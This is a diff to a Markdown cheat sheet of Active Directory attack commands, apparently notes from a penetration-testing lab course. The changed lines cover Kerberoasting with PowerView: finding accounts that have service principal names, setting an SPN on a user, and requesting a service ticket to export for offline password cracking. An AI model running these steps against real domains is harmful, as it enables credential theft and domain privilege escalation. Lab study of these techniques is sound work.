@@ -741,7 +741,7 @@ Get-RemoteCachedCredential -Computername dcorp-dc -Verbose
 ```
 # Domain Privilege escalation
 ## Kerberoast
-Roast service accounts which are users, passwords set manually. Might be able to crack.
+Roast service accounts which are users and probably have passwords set manually. These might be crackable.
 #### Find user accounts used as service accounts
 ```
 Get-NetUser -SPN
@@ -813,8 +813,13 @@ Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match “RDPUsers”} 
 #### Check if user has SPN
 ```
 . ./Powerview_dev.ps1
-Get-DomainUser -Identity supportuser | select Serviceprincipalname
-Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName
+Get-DomainUser -Identity supportuser | select samaccountname, serviceprincipalname
+```
+
+of
+
+```
+Get-NetUser | Where-Object {$_.servicePrincipalName}
 ```
 
 #### Set SPN for the user
@@ -825,7 +830,7 @@ Set-DomainObject -Identity support1user -Set @{serviceprincipalname=’ops/whate
 #### Request a TGS
 ```
 Add-Type -AssemblyName System.IdentityModel 
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/whatever1"
 ```
 
 #### Export ticket to disk for offline cracking
